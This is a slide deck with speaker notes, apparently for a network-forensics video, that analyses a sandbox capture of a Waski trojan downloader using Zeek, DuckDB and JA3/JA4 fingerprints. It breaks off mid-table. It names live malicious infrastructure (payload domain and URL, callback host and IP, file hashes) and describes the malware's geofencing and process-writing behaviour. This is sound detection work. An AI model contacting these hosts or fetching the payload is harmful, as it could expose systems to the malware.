---
theme: default
title: 'Waski Downloader — Cloudflare Payload, Silent Callbacks'
youtube: 9L2jrtzSX6Q
facebook: https://www.facebook.com/122102994639505526/videos/28918238381193304
canvasWidth: 900
lineNumbers: true
routerMode: hash
---

# Unpack the PCAP: Waski Downloader
## Cloudflare Payload, Silent Callbacks

<!--
- Welcome back to Unpack the PCAP. I'm Keith. Let's crack open another PCAP.
- Today we're looking at a Waski trojan downloader — a C++ sample that pulls its payload through Cloudflare's TLS infrastructure, so the download looks like ordinary web browsing.
- Date: September 3rd, 2026.
- This one's interesting because the malware piggybacks on Cloudflare IPs, making the malicious TLS sessions look like routine web traffic.
- JOKE: It's like stashing a body at the county landfill. Technically it's findable — but nobody's excavating 12 million tons of garbage on a hunch.
-->

---
layout: center
---

## Get these interactive slides at

# https://www.UnpackThePCAP.com

<!--
- Slides are live at UnpackThePCAP.com — every query in this deck is there to copy and paste.
- JOKE: Every query in this deck is copy-pasteable. Yes, I am asking you to paste code off the internet into a terminal. I'm aware of what this episode is about. Do it anyway.
-->

---

## Source & Attribution

All data in this presentation comes from publicly available sources:

- PCAP Source:    [Triage sandbox](https://tria.ge/260903-sr1gxawwhv)
- Sample ID:      260903-sr1gxawwhv
- Capture Date:   September 3rd, 2026
- Analysis:       Triage behavioral + network analysis report

Every IP address, domain name, file hash, timestamp, and
command shown in this deck was extracted directly from:

- The published PCAP file
- Zeek logs generated from the PCAP
- [Triage sandbox behavioral analysis](https://tria.ge/260903-sr1gxawwhv) (TLS-decrypted traffic)
- WHOIS and GeoIP lookups against the IPs

<!--
- Before we start: everything here is from publicly available sources.
  - PCAP and analysis from Triage sandbox.
  - Every IP, domain, hash, and timestamp is backed by the PCAP itself or the sandbox report.
  - We ran Zeek against the PCAP to generate our own logs.
  - Some HTTP details (GET request, User-Agent, 301/404 responses) come from the Triage sandbox's TLS decryption — not from Zeek, which only saw encrypted TLS.
- JOKE: Everything here is public. I'm the true crime podcast of cybersecurity — somebody else did the crime, and I show up afterward with a nice microphone and too much confidence.
-->

---

## Outline

| | |
|---|---|
| 1. Intro & Context | 6. Benign Noise & GeoIP |
| 2. Traffic Overview & Ownership | 7. Indicators of Compromise |
| 3. Payload Delivery (TLS) | 8. Detection: Zeek |
| 4. shaf.in — Callback Discovery | 9. Detection Script Testing |
| 5. Fingerprints & Retry Behavior | 10. Key Takeaways |

<!--
- Ten sections covering the Waski downloader's network behavior from the first DNS lookup to its last failed callback.
- We'll separate the malicious traffic from the noise, and give you detection rules you can deploy today.
- JOKE: Ten sections for a file smaller than a selfie. To be fair, your selfie never retried shaf.in eleven times in 78 seconds.
- Let's fire up Zeek.
-->

---

## Infection Chain Overview

<pre>
   Waski executes (10.127.0.5)
     └─ drops + runs codecsupdater.exe ← all malicious traffic
         │
         ▼
   Cloudflare-fronted TLS → packaging-labelling.com
     ├─ GET /images/full/wav.exe → 404 (payload pulled)
     └─ One JA3/JA4 across all 5 sessions
         │
         ▼
   Callbacks → shaf.in (103.212.120.166)
     ├─ Retried relentlessly — every one fails, zero bytes back
     └─ Two JA3/JA4, strictly alternating
</pre>

<!--
- Two destinations, two completely different hiding strategies — but the same TLS client behind both.
- packaging-labelling.com sits behind Cloudflare. The sandbox decrypted the TLS and found a GET request for /images/full/wav.exe — the payload was already gone (404). Five TLS sessions, all carrying one identical JA3/JA4 fingerprint.
- shaf.in resolves straight to a bare Indian server — no CDN, no proxy. Eleven TCP connections, but only six got as far as a TLS Client Hello — and every one of those failed, zero response bytes. This is where the two fingerprints strictly alternate.
- I'm calling shaf.in "callbacks" rather than command-and-control on purpose. Not a single TLS session to it completed, so we never see one byte of application data in either direction — there's nothing in this capture that shows commands being issued. Triage doesn't label it either: the sample's only tags are family:waski, downloader and discovery. A fallback download server would look exactly like this. So: this is a second piece of hardcoded infrastructure, retried relentlessly, purpose unproven.
- The key: the same malware uses the same TLS client profiles for both domains.
- The fingerprints alone aren't proof — other software could share them. But this profile, aimed at these domains, retrying every few seconds? That's your signal.
- JOKE: It ordered from a restaurant that shut down six months ago, then called a friend who let it ring eleven times. These are the saddest 78 seconds in the PCAP.
-->

---

## Waski: What Are We Looking At?

- **Family:** Waski (C++ trojan downloader)
- **Score:** 10/10 (Triage)
- **Size:** 19,152 bytes (19 KB)
- **MD5:** `1e006fbba32dfa9f51c3eadd008a5441`
- **SHA256:** `b7aa81367a69a2259b33593ca5638c041dfa90f5d0f148a3bb204fdcba6d2c2c`

<!--
- Per the Triage analysis, this is Waski — a C++ downloader that scores a perfect 10 out of 10 on the threat scale.
- At 19 KB, it's tiny. Think of it as the opening act — it doesn't do the damage itself, it just sets the stage for whatever comes next.
- Hashes on screen if you're playing along at home — MD5 and SHA256, straight from the Triage report.
- One thing that will confuse you if you follow the Triage link: the submitted filename is 2026-09-01, the MD5, then "elex_wannacry.exe". That's feed-naming noise from whoever collected the sample, not a verdict. Triage's own tags on this thing are family:waski, downloader and discovery — there is no ransomware tag, and nothing in the behavior looks like encryption. It's a downloader.
- JOKE: The filename on the sample says "elex_wannacry." It is neither. Somewhere upstream a collection pipeline took one look at this thing and guessed, and now that guess is going to follow it around forever like a bad high school nickname.
- Next up: what the sandbox actually saw it do.
-->

---

## Sandbox Behavior

**Behaviors observed in sandbox:**

- Registry check for country code — likely geo-fencing
- System language discovery
- Physical storage device enumeration
- Writes into and runs `codecsupdater.exe` — **the child sends all the malicious traffic**

<!--
- Here's what the sandbox observed it doing.
- First: it reads Control Panel\International\Geo\Nation for the country code, and Control\NLS\Language for the system language. Triage's own words are "likely geofence." It wants to confirm it's on the right target before downloading anything.
- Second: it enumerates physical storage devices. Triage describes this as attempting to interact with connected storage and optical drives, and tags it as system information discovery. Tempting to call this an anti-VM check, but nothing in the sandbox data actually says that, so we won't.
- Third, and this one reframes the whole episode: it writes codecsupdater.exe into the user's Temp directory, writes into that process's memory — Triage logs "PID 2380 wrote to memory of 3932" — and runs it. The 19 KB sample we just hashed is done at 766 milliseconds and terminates; the child starts at 750 and never exits. So by the time any malicious traffic leaves this box, the only malware process still alive is codecsupdater.exe, pid 3932.
- To be precise about it, though: not every packet in this capture is the malware's. Most of them are Windows being Windows — telemetry, updates, OCSP — and we'll spend a slide on that noise later. What the child owns is the malicious half: the packaging-labelling.com sessions and every callback to shaf.in.
- So when I say "the malware connects to shaf.in," I mean the dropped child, not the file you'd get from Triage's download button. That distinction matters if you're hunting: the dropped file is 19,344 bytes, MD5 fc4723973fc570c08445a5feed41742b — nearly the same size as its parent, but a different hash. It's in the IOC list.
- It also explains the User-Agent we'll see later. "Updates downloader" is codecsupdater.exe telling on itself.
- JOKE: It enumerates your drives like a burglar counting the TVs before deciding whether the job is even worth doing.
- JOKE: `codecsupdater.exe`. The name *is* the technique. It's engineered so your eye slides off it in Task Manager — the beige sedan of executables.
-->

---

## Traffic Overview: Zeek Log Generation

```bash
zkg install salesforce/ja3
zkg install foxio/ja4

mkdir -p output
zeek -C -r pcaps/waski_260903-sr1gxawwhv/waski_260903-sr1gxawwhv.pcapng \
     Log::default_logdir=output \
     ja3 ja4
```

Runs from the episode root. `Log::default_logdir` won't create `output/`, hence the `mkdir`. The two `zkg` packages are a prerequisite — without them, `ja3 ja4` won't load.

<!--
- We generated Zeek logs by running zeek -C -r against the PCAP from the episode root.
- Log::default_logdir=output tells Zeek to drop the logs into output/ instead of the current directory. One gotcha: Zeek won't create that directory for you — it just errors on every writer — so mkdir -p first.
- Everything else in this deck runs from this same directory, so the paths stay consistent all the way through.
- The -C flag tells Zeek to ignore checksums — standard for offline analysis.
- The ja3 and ja4 arguments load two zkg packages that add TLS fingerprint fields to ssl.log. Install them first — Zeek can't load them otherwise, and everything we do in the fingerprinting section depends on those fields existing. We'll come back to what they actually compute later.
- JOKE: Zeek will not create the output directory for you. It will, however, error once per log writer, so you fully appreciate the scale of what you've done.
-->

---

## Traffic Overview: What Zeek Produced

**Output:**
```
conn.log      dns.log       ssl.log       http.log
files.log     x509.log      ocsp.log      packet_filter.log
```

**Capture stats:**
- 1,492 packets / 840,866 bytes / ~150 seconds
- Victim IP: `10.127.0.5`
- Protocols: TCP (1,429), UDP (42), ARP (19), ICMP (2) — 1,492 frames

<!--
- Eight log files out of a capture that lasts two and a half minutes.
- 1,492 packets over about 150 seconds — 840,866 bytes all in.
- The victim is 10.127.0.5 — a private IP, so this was captured on an internal network.
- Now, this capture is noisy. A LOT of Microsoft telemetry. Our job is to find the needle in the haystack.
- JOKE: Two ICMP packets in the entire capture, and both are the gateway complaining that someone's packets are too big. The router's whole contribution to this incident was filing a noise complaint.
- JOKE: Nineteen ARP frames. Nobody has voluntarily read an ARP frame since 2004 and we are not going to break that streak today.
- JOKE: Eight log files from 150 seconds of traffic. Zeek is the coworker who minutes every meeting — insufferable in standup, indispensable during an incident.
-->

---

## Victim Identification

```bash
cat output/conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn | head -5
```

```
    86 10.127.0.5
     1 10.127.0.1
```

<!--
- Let's confirm the victim. Every outbound connection originates from 10.127.0.5 — that's our infected host.
- 10.127.0.1 is the gateway, not a second victim — it's the ICMP flow from the last slide. Nothing suspicious.
- JOKE: 10.127.0.5 — private IP, public humiliation. It just wanted its Windows updates.
- Next: what our victim was actually asking DNS for.
-->

---

## DNS Queries: Finding the Needle

```bash
cat output/dns.log | zeek-cut query | sort | uniq -c | sort -rn
```

<pre>
   4 oneocsp.microsoft.com
   3 settings-win.data.microsoft.com
   3 ctldl.windowsupdate.com
   2 slscr.update.microsoft.com
   2 fe3cr.delivery.mp.microsoft.com
   1 <span style="color:#dc322f">www.packaging-labelling.com   ← malicious</span>
   1 <span style="color:#dc322f">shaf.in                       ← malicious (callback)</span>
   1 <span style="color:#dc322f">packaging-labelling.com       ← malicious</span>
   1 ocsp.digicert.com
   1 nexusrules.officeapps.live.com
   1 login.live.com
   1 dl.delivery.mp.microsoft.com
   1 c.pki.goog
</pre>

<!--
- Here's the DNS query breakdown — thirteen unique names, and it's basically a Microsoft family reunion.
- Three entries don't belong: packaging-labelling.com, its www variant, and shaf.in — the callback host we'll visit later.
- One DNS query each. Hiding in plain sight, like they're avoiding a group photo.
- JOKE: "packaging-labelling.com" is a name tag that reads "Definitely Not A Predator." No legitimate business has ever had to work that hard at sounding boring.
-->

---

## DuckDB Setup — Zeek Extension

We use DuckDB with Yacin Nadji's `zeek` extension to query Zeek logs:

```
$ duckdb -c "FORCE INSTALL zeek FROM community; FORCE INSTALL inet;"
```

Every query includes `LOAD zeek; LOAD inet;` before reading logs.

<!--
- Before we run queries, we need to install the DuckDB Zeek extension by Yacin Nadji.
- This extension provides the read_zeek() function that reads Zeek TSV logs directly.
- The inet extension handles IP address column types.
- JOKE: FORCE INSTALL — because after thirty years in cybersecurity, I've learned everything works better when it's a little scared of you.
- JOKE: The malware executed for 150 seconds. I've spent longer than that explaining DuckDB. One of us is the real threat and it's not the malware.
-->

---

## Protocol Breakdown

```sql
LOAD zeek;
LOAD inet;
SELECT proto, count(*) as cnt
FROM read_zeek('output/conn.log')
GROUP BY proto ORDER BY cnt DESC;
```

```
┌─────────┬───────┐
│  proto  │  cnt  │
│ varchar │ int64 │
├─────────┼───────┤
│ tcp     │    66 │
│ udp     │    20 │
│ icmp    │     1 │
└─────────┴───────┘
```

<!--
- Let's break down the traffic by protocol. 66 TCP rows, 20 UDP, and one ICMP.
- Careful how you read that TCP number: those are conn.log rows, not connections. The host only used 45 source ports, and it picks a fresh one for every new connection — so 45 is the real count. The extra 21 rows are Zeek closing out unanswered SYN attempts after five seconds, which means a client retransmitting into silence gets logged several times over. We watch that happen on the shaf.in slides.
- The UDP is entirely DNS — 22 queries riding in those 20 rows, all to 8.8.8.8.
- The TCP is where the action is — TLS, HTTP, and the suspicious connections.
- JOKE: 45 connections in 150 seconds. Eleven of them got nothing back — not one byte. I have sat in sprint plannings with exactly that throughput.
- JOKE: One ICMP flow — and it's just the gateway telling the host its packets are too big. Not a ping. Sorry, Captain Ramius.
-->

---

## DNS: Malicious Domains

```sql
LOAD zeek;
LOAD inet;
SELECT query, answers, ts
FROM read_zeek('output/dns.log')
WHERE query LIKE '%packaging-labelling%'
   OR query LIKE '%shaf.in%';
```

```
┌─────────────────────────────┬────────────────────────────────┬───────────────────────────────┐
│            query            │            answers             │              ts               │
│           varchar           │           varchar[]            │   timestamp with time zone    │
├─────────────────────────────┼────────────────────────────────┼───────────────────────────────┤
│ packaging-labelling.com     │ [104.21.27.45, 172.67.168.231] │ 2026-09-03 11:22:20.46568-04  │
│ www.packaging-labelling.com │ [172.67.168.231, 104.21.27.45] │ 2026-09-03 11:23:27.66098-04  │
│ shaf.in                     │ [103.212.120.166]              │ 2026-09-03 11:23:28.496806-04 │
└─────────────────────────────┴────────────────────────────────┴───────────────────────────────┘
```

<!--
- Now let's isolate the malicious DNS queries. Three domains — packaging-labelling.com resolved first at 11:22:20.4657. The capture starts at 11:22:17.7062, so that's 2.8 seconds in — and by then the parent had already exited and the dropped child was the only malware process running. Then www.packaging-labelling.com and shaf.in roughly 67 seconds later.
- packaging-labelling.com resolves to 104.21.27.45 and 172.67.168.231. Classic Cloudflare anycast — we'll confirm with WHOIS on the next slide.
- www.packaging-labelling.com resolves to the same two IPs. And note the malware didn't decide to try the www host on its own — this lookup lands 0.9 seconds after the first apex session that actually completed a handshake, because the server answered that one with a 301 pointing at www. We'll see that redirect on the sandbox slide.
- shaf.in resolves to a single IP: 103.212.120.166. WHOIS shows MilesWeb — not a known CDN provider. Also confirmed on the next slide.
- JOKE: Malware that honors HTTP redirects. It reads the `Location` header. It respects the standard. It is going to die having done absolutely everything correctly except the crime.
-->

---

## IP Ownership: Who's Behind These Addresses

```bash
whois 104.21.27.45 | grep -iE "NetName|OrgName"
whois 172.67.168.231 | grep -iE "NetName|OrgName"
whois 103.212.120.166 | grep -iE "netname|descr"
```

```
NetName:        CLOUDFLARENET
OrgName:        Cloudflare, Inc.
NetName:        CLOUDFLARENET
OrgName:        Cloudflare, Inc.
netname:        MWNASHIK
descr:          MilesWeb Internet Services Pvt Ltd
descr:          Route for 103.212.120.0/23
```

packaging-labelling.com sits behind Cloudflare. shaf.in is a bare Indian server — no CDN, no proxy.

<!--
- Before we look at TLS, let's confirm who owns these IPs. WHOIS lookups against ARIN and APNIC.
- Both packaging-labelling.com IPs: CLOUDFLARENET — Cloudflare, Inc. Confirmed anycast proxy.
- shaf.in: MilesWeb Internet Services, an Indian hosting provider. No CDN, no Cloudflare, no hiding.
- This matters because Cloudflare IPs are shared across millions of sites — blocking by IP would hit innocent customers. Detection has to be by domain or TLS fingerprint.
- JOKE: Sure, block these Cloudflare IPs. You'll take out a respectable fraction of the internet to stop one 19 KB downloader. It's a wasp problem you're proposing to solve with a controlled burn.
-->

---

## TLS: packaging-labelling.com

```sql
LOAD zeek;
LOAD inet;
SELECT server_name, version, established, resumed, ssl_history
FROM read_zeek('output/ssl.log')
WHERE server_name LIKE '%packaging-labelling%'
ORDER BY ts;
```

```
┌─────────────────────────────┬─────────┬─────────────┬─────────┬─────────────┐
│         server_name         │ version │ established │ resumed │ ssl_history │
│           varchar           │ varchar │   boolean   │ boolean │   varchar   │
├─────────────────────────────┼─────────┼─────────────┼─────────┼─────────────┤
│ packaging-labelling.com     │ TLSv12  │ false       │ false   │ Csxkn       │
│ packaging-labelling.com     │ TLSv12  │ true        │ false   │ CsxknGIti   │
│ www.packaging-labelling.com │ TLSv12  │ true        │ false   │ CsxknGIti   │
│ packaging-labelling.com     │ TLSv12  │ true        │ true    │ CsiI        │
│ www.packaging-labelling.com │ TLSv12  │ true        │ true    │ CsiI        │
└─────────────────────────────┴─────────┴─────────────┴─────────┴─────────────┘
```

All five sessions ran TLS 1.2 to Cloudflare IPs — cert details on the next slides.

<!--
- Five TLS sessions to packaging-labelling.com. All TLS 1.2 — version column confirms it.
- First session fails (established=false), next two succeed with new handshakes (established=true, resumed=false), last two resume (resumed=true).
- JOKE: Five TLS sessions to a server that had already told it no. This is a downloader that hears "404" as "not yet."
-->

---

## TLS Certificate Details

Non-resumed connections have cert chain data. Resumed sessions don't re-send certs.

```sql
LOAD zeek;
LOAD inet;
SELECT uid, established, resumed
FROM read_zeek('output/ssl.log')
WHERE server_name LIKE '%packaging-labelling%'
  AND cert_chain_fps IS NOT NULL
ORDER BY ts;
```

```
┌────────────────────┬─────────────┬─────────┐
│        uid         │ established │ resumed │
│      varchar       │   boolean   │ boolean │
├────────────────────┼─────────────┼─────────┤
│ CCXzbh2qm8ooZFRbEb │ false       │ false   │
│ CYGKRv3lCDo60SBlpi │ true        │ false   │
│ CRj69c2SiEQ4iPG9cf │ true        │ false   │
└────────────────────┴─────────────┴─────────┘
```

We'll use `CYGKRv3lCDo60SBlpi` — established, not resumed.

<!--
- Resumed TLS sessions skip the cert exchange — they reuse a previously negotiated session, so cert_chain_fps is NULL for those.
- Filtering to cert_chain_fps IS NOT NULL gives us the three connections that actually completed a full handshake and received the cert chain.
- These are the only connections where we can pull the full certificate chain.
- Next slide: we'll prove all three share the same chain.
- JOKE: Resumed sessions skip the cert exchange. Even threat actors have loyalty programs.
-->

---

## One Chain, Three Connections

All three share the same chain — one unique hash across all three:

```sql
LOAD zeek;
LOAD inet;
SELECT md5(CAST(cert_chain_fps AS VARCHAR)) AS chain_hash,
       count(*) AS cnt
FROM read_zeek('output/ssl.log')
WHERE server_name LIKE '%packaging-labelling%'
  AND cert_chain_fps IS NOT NULL
GROUP BY chain_hash;
```

```
┌──────────────────────────────────┬───────┐
│            chain_hash            │  cnt  │
│             varchar              │ int64 │
├──────────────────────────────────┼───────┤
│ c0015ec845325327567f89f3fc21ae5e │     3 │
└──────────────────────────────────┴───────┘
```

<!--
- To prove all three share the same cert chain, we hash the cert_chain_fps array and count. One unique hash, count three — confirmed.
- Any of the three would work for pulling the cert chain. We picked CYGKRv3lCDo60SBlpi because it's established and non-resumed — the cleanest example.
- JOKE: Three full handshakes, one identical cert chain. The attacker bought exactly one certificate and is going to get every penny of value out of it.
- Next slide: we'll pull the full cert chain for this connection.
-->

---

## TLS Certificate Chain

```sql
LOAD zeek;
LOAD inet;
SELECT regexp_extract(x.certificate_subject, 'CN=([^,]+)', 1) AS subject_cn,
       regexp_extract(x.certificate_issuer, 'CN=([^,]+)', 1) AS issuer_cn,
       regexp_extract(x.certificate_issuer, 'O=([^,]+)', 1) AS issuer_org
FROM read_zeek('output/ssl.log') s,
     read_zeek('output/x509.log') x
WHERE s.uid = 'CYGKRv3lCDo60SBlpi'
  AND x.fingerprint IN
      (s.cert_chain_fps[1], s.cert_chain_fps[2], s.cert_chain_fps[3])
ORDER BY array_position(s.cert_chain_fps, x.fingerprint);
```

```
┌─────────────────────────┬────────────────────┬───────────────────────────┐
│       subject_cn        │     issuer_cn      │        issuer_org         │
│         varchar         │      varchar       │          varchar          │
├─────────────────────────┼────────────────────┼───────────────────────────┤
│ packaging-labelling.com │ WE1                │ Google Trust Services     │
│ WE1                     │ GTS Root R4        │ Google Trust Services LLC │
│ GTS Root R4             │ GlobalSign Root CA │ GlobalSign nv-sa          │
└─────────────────────────┴────────────────────┴───────────────────────────┘
```

<!--
- The full cert chain for one connection. Three levels: leaf → intermediate → root.
- We picked CYGKRv3lCDo60SBlpi because it's a non-resumed connection — resumed sessions (the last two) don't re-send the cert chain, so cert_chain_fps is NULL for those.
- The leaf is signed by WE1, a Google Trust Services intermediate. WE1 is signed by GTS Root R4, a Google root CA. GTS Root R4 is cross-signed by GlobalSign Root CA — a well-known public root.
- This is a legitimate, publicly-trusted certificate chain. The attacker didn't forge it — they obtained a real cert from Google Trust Services.
- This means the attacker controls the domain and passed Google's domain validation checks. The cert is valid, publicly trusted, and chaining to a known root.
- JOKE: The malware has a certificate from Google Trust Services. My self-signed certs get rejected by Chrome. Apparently malware has better CA relationships than I do.
-->

---

## Sandbox Reveal: What's Under the TLS

Per the [Triage sandbox](https://tria.ge/260903-sr1gxawwhv) (TLS-decrypted traffic — not visible in Zeek):

```
GET /images/full/wav.exe HTTP/1.1
Host: packaging-labelling.com
User-Agent: Updates downloader
```

**Response:** 301 redirect → `www.packaging-labelling.com`

**Final response:** 404 Not Found

<!--
- Here's where the sandbox earns its keep. Zeek only sees TLS connections to packaging-labelling.com — the HTTP is encrypted inside.
- The Triage sandbox decrypted the TLS and revealed the actual HTTP request: GET /images/full/wav.exe with a hardcoded User-Agent "Updates downloader."
- It's trying to download a Windows executable disguised as a WAV audio file. Subtle.
- The server returned a 301 redirect to the www subdomain — the Location header points at the exact same path — and then a 404. The malware follows the redirect and asks again, which is why you'll see two connections per attempt.
- And it does the whole thing twice: 301 then 404 at 11:23, 301 then 404 again at 11:24. Four requests for wav.exe in total.
- The file was pulled, but the site itself is still serving traffic normally. This is a live host missing one payload, not abandoned infrastructure.
- JOKE: The server didn't just say no. It sent a 301 to the www subdomain — the exact same path — so the malware could go ask again somewhere else and get told no there instead. That's not infrastructure failure, that's customer service.
- JOKE: /images/full/wav.exe — three lies in one URL. The directory says images, the name says audio, the extension says executable. That's commitment to the bit.
-->

---

## Finding the 404 Connection

Sandbox flow: GET → 301 redirect → follow → 404. Filter conn.log to Cloudflare IPs:

```bash
cat output/conn.log | zeek-cut uid ts id.resp_h orig_bytes resp_bytes duration \
  | grep -E "172.67.168.231|104.21.27.45" \
  | sort -t$'\t' -k5 -rn | head -3
```

```
CRj69c2SiEQ4iPG9cf  1788449007.720362  172.67.168.231  500  68346  24.665046
CEJnbb339h1dS9HFh5  1788449075.618299  104.21.27.45    650  65482   0.895419
CYGKRv3lCDo60SBlpi  1788449006.727730  172.67.168.231  492   4886   0.927468
```

Timeline: `CYGKRv3lCDo60SBlpi` (ts=...006, 4,886 bytes) = 301 redirect → `CRj69c2SiEQ4iPG9cf` (ts=...007, 68,346 bytes) = 404. Forty-two seconds later it runs the whole sequence again — its own 301 at ts=...050, then `CEJnbb339h1dS9HFh5` (ts=...075, 65,482 bytes) = a second 404. Different IP, same site: both addresses are Cloudflare A records for this hostname.

<!--
- We started with the Cloudflare IPs from the DNS slide, filtered conn.log to those IPs, and sorted by response bytes.
- The top two responses (68KB, 65KB) are the 404 pages. The third (4.8KB) is the 301 redirect.
- These 404s came from the real website, not from Cloudflare. Every response here carries `cf-cache-status: DYNAMIC`, which Cloudflare's cache docs define as the asset being ineligible for cache, so the request went to the origin web server without a cache lookup. So that's the site's own themed 404 page, 68 KB of it.
- So the site is alive and well. It just doesn't have wav.exe anymore.
- Timestamp order proves the flow: CYGKRv3lCDo60SBlpi (301 redirect) → CRj69c2SiEQ4iPG9cf (404).
- One thing head -3 hides: the malware runs the whole sequence twice. There's a second, smaller 301 at ts=...050 — only 2,014 response bytes, because that session resumed TLS and skipped the cert exchange — and CEJnbb339h1dS9HFh5 is the 404 at the end of that second attempt, not a bare retry.
- JOKE: 68 KB of 404 — three times larger than the malware itself. That error page has more content than the malware's entire career.
-->

---

## Connection CRj69c2SiEQ4iPG9cf

The key TLS session — the one that received the 404 payload:

```sql
LOAD zeek;
LOAD inet;
SELECT uid, id_resp_h, orig_bytes, resp_bytes,
       duration, conn_state
FROM read_zeek('output/conn.log')
WHERE uid = 'CRj69c2SiEQ4iPG9cf';
```

```
┌────────────────────┬────────────────┬────────────┬────────────┬─────────────────┬────────────┐
│        uid         │   id_resp_h    │ orig_bytes │ resp_bytes │    duration     │ conn_state │
│      varchar       │      inet      │   uint64   │   uint64   │    interval     │  varchar   │
├────────────────────┼────────────────┼────────────┼────────────┼─────────────────┼────────────┤
│ CRj69c2SiEQ4iPG9cf │ 172.67.168.231 │        500 │      68346 │ 00:00:24.665046 │ S1         │
└────────────────────┴────────────────┴────────────┴────────────┴─────────────────┴────────────┘
```

- 68,346 response bytes = the TLS-encrypted response (the site's own 404 page)
- `conn_state: S1` — connection established but no FIN/RST seen

<!--
- Connection UID CRj69c2SiEQ4iPG9cf — 500 bytes sent, 68,346 bytes received.
- The Triage sandbox decrypted the TLS on this session and it's a 404. What ties the two together is the source port: Triage logs that flow as 10.127.0.5:49943 → 172.67.168.231:443, and CRj69c2SiEQ4iPG9cf is the conn.log record with id.orig_p 49943. Its duration matches too — Triage's 70014 to 94679 ms is 24.665 seconds, the same figure conn.log shows.
- JOKE: 500 bytes of question, 68 KB of "no." That is the reply-to-substance ratio of a legal department.
- JOKE: `S1` means nobody ever hung up. The capture ends with both sides still politely pretending the conversation is going somewhere.
-->

---

## DNS: shaf.in — The Callback Domain

```sql
LOAD zeek;
LOAD inet;
SELECT query, answers, TTLs, ts
FROM read_zeek('output/dns.log')
WHERE query = 'shaf.in';
```

```
┌─────────┬───────────────────┬──────────────┬───────────────────────────────┐
│  query  │      answers      │     TTLs     │              ts               │
│ varchar │     varchar[]     │  interval[]  │   timestamp with time zone    │
├─────────┼───────────────────┼──────────────┼───────────────────────────────┤
│ shaf.in │ [103.212.120.166] │ ['06:00:00'] │ 2026-09-03 11:23:28.496806-04 │
└─────────┴───────────────────┴──────────────┴───────────────────────────────┘
```

- Single A record → `103.212.120.166`
- TTL: 6 hours (21,600 seconds — DuckDB renders it as an interval)
- WHOIS: MilesWeb — not a known CDN provider

<!--
- shaf.in is the second destination. WHOIS shows MilesWeb, not a known CDN — just a domain pointing to a single IP.
- The timing is the interesting part. The first bytes of the 404 hit the wire 70.7882 seconds into the capture. This DNS query goes out at 70.7906 — two and a half milliseconds later, while the 68 KB error page is still streaming in and won't finish arriving until 70.87. It read the status line, wrote that host off, and moved on without waiting for the body.
- Then it alternates: hammer shaf.in, go back and re-request wav.exe from the payload host, collect another 404, back to shaf.in.
- That interleaving reads more like a backup download source than a command channel. But no handshake to shaf.in ever completed, so no application data was ever exchanged, and I'm not going to tell you which one it is when the capture can't.
- TTL of 6 hours is long for a malicious domain. The attacker isn't worried about takedowns.
- JOKE: "shaf.in" — four letters and a country code. The domain equivalent of a burner phone bought with exact change.
- JOKE: It read the 404 status line and was already dialing shaf.in two and a half milliseconds later, with the error page still arriving. That's not efficiency. That's a downloader that has been let down before.
-->

---
layout: default
class: compact-code
---

## TLS: shaf.in — All Failures

```sql
LOAD zeek;
LOAD inet;
SELECT uid, id_resp_h, established, ssl_history
FROM read_zeek('output/ssl.log')
WHERE server_name = 'shaf.in';
```

```
┌────────────────────┬─────────────────┬─────────────┬─────────────┐
│        uid         │    id_resp_h    │ established │ ssl_history │
│      varchar       │      inet       │   boolean   │   varchar   │
├────────────────────┼─────────────────┼─────────────┼─────────────┤
│ CbbDpijwndckuKq6g  │ 103.212.120.166 │ false       │ C           │
│ CYZV5y3dcYUWLFRra7 │ 103.212.120.166 │ false       │ C           │
│ CXakOaMlMwAcQQHoa  │ 103.212.120.166 │ false       │ C           │
│ CaH7zPcR7QpHSQShj  │ 103.212.120.166 │ false       │ C           │
│ Cr1j7L1LQhiVZIdbx7 │ 103.212.120.166 │ false       │ C           │
│ Csq0bps6WIqwnH8h4  │ 103.212.120.166 │ false       │ C           │
└────────────────────┴─────────────────┴─────────────┴─────────────┘
```

- **Every session failed** — `established: false`, `ssl_history: C` (Client Hello only)
- 6 of 11 TCP connections sent a Client Hello; 3 connected silently, 2 never established

<!--
- Six TLS sessions to shaf.in — out of eleven TCP connections. All six failed.
- All six ran exactly 5.077 seconds before closing, and it's the server that closes them. The history on every one is `ShADafF` — lowercase `f`, the responder's FIN, lands before the uppercase `F`. The server completes the handshake's TCP half, acknowledges the Client Hello, sits on it for five seconds, then hangs up. That's a server-side idle timeout, and it's what sets the malware's retry cadence: the gaps between attempts are 5.08 seconds because the malware reconnects the instant it gets dropped.
- JA3/JA4 analysis on the next slides.
- JOKE: Six attempts, zero responses. The server didn't even have the courtesy to say "new phone who dis."
-->

---

## JA3 + JA4 Fingerprints

From the `salesforce/ja3` and `foxio/ja4` packages we installed back on the log-generation slide.

**JA3** concatenates SSL version, cipher suites, extensions, elliptic curves, and point formats from the Client Hello, then MD5-hashes the string into a 32-character fingerprint.

**JA4** is the successor: it produces a human-readable `a_b_c` string encoding TLS version, SNI presence, cipher count, extension count, and ALPN protocol in part `a`, a 12-character truncated SHA256 of the hex-sorted cipher suites in part `b`, and a 12-character truncated SHA256 of the hex-sorted extensions — excluding SNI and ALPN — followed by the signature algorithms in part `c`.

Both fingerprint the client's TLS implementation regardless of which domain it connects to.

<!--
- JA3 and JA4 are TLS client fingerprinting methods.
- These are the two packages we installed back on the log-generation slide — they add ja3, ja3s, ja4, ja4s fields to ssl.log. Without them those columns simply don't exist, which is why the install had to come first.
- JA3 gives you a 32-char MD5 hash — simple, widely supported.
- JA4 gives you a human-readable string with more detail — version, cipher count, extension count.
- ALPN is Application-Layer Protocol Negotiation — the client lists the protocols it can speak (h2, http/1.1) right in the Client Hello, so HTTP/2 gets agreed during the handshake instead of costing a round trip after it. Every benign Client Hello on this box offers it. None of the malware's eleven do.
- Both survive domain rotation — the malware's TLS stack stays the same even if the infrastructure changes.
- JOKE: The attacker can burn the domain, rotate the IP, rename the binary, and re-host on a different continent — and the handshake comes out byte-identical every time, because nobody recompiles the TLS library to hide. It's DNA evidence left by someone who took the trouble to wear gloves.
-->

---

## JA3 + JA4: This Malware's Fingerprints

```sql
LOAD zeek;
LOAD inet;
SELECT DISTINCT ja3 AS ja3_client, ja4 AS ja4_client
FROM read_zeek('output/ssl.log')
WHERE server_name IN ('packaging-labelling.com', 'www.packaging-labelling.com', 'shaf.in');
```

```
┌──────────────────────────────────┬──────────────────────────────────────┐
│            ja3_client            │              ja4_client              │
│             varchar              │               varchar                │
├──────────────────────────────────┼──────────────────────────────────────┤
│ a0e9f5d64349fb13191bc781f81f42e1 │ t12d190800_d83cc789557e_7af1ed941c26 │
